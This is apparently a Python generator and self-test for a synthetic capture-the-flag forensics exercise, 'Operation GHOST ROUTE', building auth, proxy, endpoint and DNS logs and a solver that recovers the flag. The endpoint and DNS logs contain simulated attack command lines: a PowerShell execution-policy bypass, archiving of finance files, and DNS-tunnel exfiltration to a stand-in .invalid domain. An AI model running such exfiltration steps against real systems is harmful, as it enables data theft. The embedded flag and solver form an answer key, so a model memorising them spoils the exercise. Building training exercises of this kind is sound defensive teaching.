#!/usr/bin/env python3
"""Generate and validate the synthetic evidence for Operation GHOST ROUTE."""

from __future__ import annotations

import argparse
import base64
import csv
import hashlib
import json
import random
import zlib
from pathlib import Path


USER = "mira.shrestha"
HOST = "WS-FIN-07"
SOURCE_IP = "10.42.7.23"
PAYLOAD_URL = "https://updates-check.invalid/assets/quarterly_update.zip"
ARCHIVE_PATH = r"C:\ProgramData\Cache\q3-forecast.7z"
PAYLOAD_SHA256 = "9f4d77a5e12ca9f74107a35df487a21719ae767252ad686f575417501a51bba7"
EXFIL_DOMAIN = "telemetry-cache.invalid"
FLAG = "flag{correlation_beats_single_alerts}"


def xor_repeat(data: bytes, key: bytes) -> bytes:
    return bytes(value ^ key[index % len(key)] for index, value in enumerate(data))


def encoded_exfil() -> str:
    compressed = zlib.compress(FLAG.encode(), level=9)
    key = bytes.fromhex(PAYLOAD_SHA256[:16])
    encrypted = xor_repeat(compressed, key)
    return base64.b32encode(encrypted).decode().rstrip("=")


def write_csv(path: Path, fields: list[str], rows: list[dict[str, str]]) -> None:
    with path.open("w", newline="", encoding="utf-8") as handle:
        writer = csv.DictWriter(handle, fieldnames=fields, lineterminator="\n")
        writer.writeheader()
        writer.writerows(rows)


def generate(output: Path, seed: int) -> None:
    output.mkdir(parents=True, exist_ok=True)
    rng = random.Random(seed)

    auth = [
        {"timestamp": "2026-08-17T03:31:08Z", "username": "admin.ops", "source_ip": "198.51.100.77", "result": "denied", "factor": "password", "device": "unknown", "risk": "high"},
        {"timestamp": "2026-08-17T03:33:40Z", "username": USER, "source_ip": SOURCE_IP, "result": "success", "factor": "password+mfa", "device": HOST, "risk": "low"},
        {"timestamp": "2026-08-17T03:14:12Z", "username": "sanjay.gurung", "source_ip": "10.42.8.31", "result": "success", "factor": "password+mfa", "device": "WS-HR-02", "risk": "low"},
        {"timestamp": "2026-08-17T03:32:10Z", "username": "admin.ops", "source_ip": "198.51.100.77", "result": "denied", "factor": "password", "device": "unknown", "risk": "high"},
        {"timestamp": "2026-08-17T03:38:51Z", "username": USER, "source_ip": SOURCE_IP, "result": "success", "factor": "session_refresh", "device": HOST, "risk": "low"},
        {"timestamp": "2026-08-17T03:28:03Z", "username": "backup.service", "source_ip": "10.42.1.15", "result": "success", "factor": "certificate", "device": "SRV-BACKUP-01", "risk": "low"},
    ]
    rng.shuffle(auth)
    write_csv(output / "auth.csv", list(auth[0]), auth)

    proxy = [
        {"timestamp": "2026-08-17T03:35:22Z", "source_ip": SOURCE_IP, "username": USER, "method": "GET", "url": PAYLOAD_URL, "status": "200", "bytes": "184221", "sha256": PAYLOAD_SHA256, "user_agent": "Mozilla/5.0"},
        {"timestamp": "2026-08-17T03:16:45Z", "source_ip": "10.42.8.31", "username": "sanjay.gurung", "method": "GET", "url": "https://hr-portal.invalid/attendance", "status": "200", "bytes": "48120", "sha256": "-", "user_agent": "Mozilla/5.0"},
        {"timestamp": "2026-08-17T03:39:02Z", "source_ip": SOURCE_IP, "username": USER, "method": "POST", "url": "https://office-suite.invalid/telemetry", "status": "204", "bytes": "812", "sha256": "-", "user_agent": "OfficeClient/16"},
        {"timestamp": "2026-08-17T03:29:09Z", "source_ip": "10.42.9.44", "username": "nabin.thapa", "method": "GET", "url": "https://news.invalid/business", "status": "200", "bytes": "96211", "sha256": "-", "user_agent": "Mozilla/5.0"},
        {"timestamp": "2026-08-17T03:35:58Z", "source_ip": SOURCE_IP, "username": USER, "method": "GET", "url": "https://updates-check.invalid/favicon.ico", "status": "404", "bytes": "233", "sha256": "-", "user_agent": "Mozilla/5.0"},
    ]
    rng.shuffle(proxy)
    write_csv(output / "proxy.csv", list(proxy[0]), proxy)

    endpoint = [
        {"timestamp": "2026-08-17T03:36:07Z", "host": HOST, "user": USER, "event": "process_start", "process": "powershell.exe", "parent": "explorer.exe", "command_line": r"powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Users\mira.shrestha\Downloads\diag.ps1"},
        {"timestamp": "2026-08-17T03:36:22Z", "host": HOST, "user": USER, "event": "process_start", "process": "7z.exe", "parent": "powershell.exe", "command_line": rf'7z.exe a -mx=9 "{ARCHIVE_PATH}" "C:\Finance\Forecasts\Q3\*"'},
        {"timestamp": "2026-08-17T03:36:39Z", "host": HOST, "user": USER, "event": "file_create", "process": "7z.exe", "path": ARCHIVE_PATH, "size": 72841},
        {"timestamp": "2026-08-17T03:37:04Z", "host": HOST, "user": USER, "event": "process_start", "process": "powershell.exe", "parent": "powershell.exe", "command_line": rf"powershell.exe -File C:\ProgramData\Cache\dns-send.ps1 -Input {ARCHIVE_PATH} -Domain {EXFIL_DOMAIN} -Encoding Base32 -Transform XOR -KeySource PayloadSHA256First8 -Compression zlib"},
        {"timestamp": "2026-08-17T03:20:01Z", "host": "WS-HR-02", "user": "sanjay.gurung", "event": "process_start", "process": "excel.exe", "parent": "explorer.exe", "command_line": "excel.exe attendance.xlsx"},
        {"timestamp": "2026-08-17T03:30:00Z", "host": "SRV-BACKUP-01", "user": "backup.service", "event": "process_start", "process": "backup-agent.exe", "parent": "services.exe", "command_line": "backup-agent.exe --incremental"},
    ]
    rng.shuffle(endpoint)
    with (output / "endpoint.jsonl").open("w", encoding="utf-8") as handle:
        for row in endpoint:
            handle.write(json.dumps(row, separators=(",", ":")) + "\n")

    encoded = encoded_exfil()
    chunks = [encoded[index:index + 12] for index in range(0, len(encoded), 12)]
    dns = [
        {"timestamp": f"2026-08-17T03:37:{10 + index * 3:02d}Z", "source_ip": SOURCE_IP, "host": HOST, "query": f"{index:02d}-{chunk}.{EXFIL_DOMAIN}", "type": "A", "response": "NXDOMAIN"}
        for index, chunk in enumerate(chunks)
    ]
    dns.extend([
        {"timestamp": "2026-08-17T03:18:11Z", "source_ip": "10.42.8.31", "host": "WS-HR-02", "query": "hr-portal.invalid", "type": "A", "response": "192.0.2.20"},
        {"timestamp": "2026-08-17T03:37:15Z", "source_ip": "10.42.9.44", "host": "WS-SALES-03", "query": "cdn.office-suite.invalid", "type": "A", "response": "192.0.2.44"},
        {"timestamp": "2026-08-17T03:40:12Z", "source_ip": SOURCE_IP, "host": HOST, "query": "time.service.invalid", "type": "AAAA", "response": "2001:db8::12"},
        {"timestamp": "2026-08-17T03:26:51Z", "source_ip": "10.42.1.90", "host": "VULN-SCANNER", "query": "00-AAAAAAAAAAAA.telemetry-cache.invalid", "type": "A", "response": "NXDOMAIN"},
    ])
    rng.shuffle(dns)
    write_csv(output / "dns.csv", list(dns[0]), dns)


def solve(output: Path) -> str:
    with (output / "proxy.csv").open(encoding="utf-8") as handle:
        proxy_rows = list(csv.DictReader(handle))
    payload = next(row for row in proxy_rows if row["url"] == PAYLOAD_URL)
    key = bytes.fromhex(payload["sha256"][:16])

    with (output / "dns.csv").open(encoding="utf-8") as handle:
        dns_rows = list(csv.DictReader(handle))
    suffix = "." + EXFIL_DOMAIN
    chunks: dict[int, str] = {}
    for row in dns_rows:
        if row["source_ip"] != SOURCE_IP or not row["query"].endswith(suffix):
            continue
        label = row["query"][: -len(suffix)]
        sequence, separator, data = label.partition("-")
        if separator and sequence.isdigit():
            chunks[int(sequence)] = data
    encoded = "".join(chunks[index] for index in sorted(chunks))
    encoded += "=" * ((8 - len(encoded) % 8) % 8)
    encrypted = base64.b32decode(encoded)
    return zlib.decompress(xor_repeat(encrypted, key)).decode()


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--output", type=Path, default=Path("evidence"))
    parser.add_argument("--seed", type=int, default=20260817)
    parser.add_argument("--selftest", action="store_true")
    args = parser.parse_args()

    if not args.selftest:
        generate(args.output, args.seed)
        print(f"Generated evidence in {args.output}")
        return 0

    recovered = solve(args.output)
    digest = hashlib.sha256(recovered.encode()).hexdigest()
    expected = hashlib.sha256(FLAG.encode()).hexdigest()
    if digest != expected:
        print("FAIL: recovered payload did not match the expected flag")
        return 1
    print(f"PASS: recovered {recovered}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
